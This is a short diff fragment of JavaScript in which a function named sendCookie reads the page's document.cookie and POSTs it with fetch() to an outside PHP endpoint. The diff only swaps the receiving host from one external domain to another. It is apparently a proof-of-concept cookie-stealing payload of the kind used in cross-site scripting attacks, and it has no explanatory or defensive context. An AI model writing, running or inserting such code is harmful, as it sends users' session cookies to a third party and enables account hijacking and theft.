@@ -2,7 +2,7 @@
 function sendCookie() {
     const cookieData = document.cookie;
     
-    fetch('https://www.lintianyuan.shop/poc/get_cookie.php', {
+    fetch('https://bushesaresafe.github.io/get_cookie.php', {
         method: 'POST',
         mode: 'cors', // 明确跨域模式
         headers: {
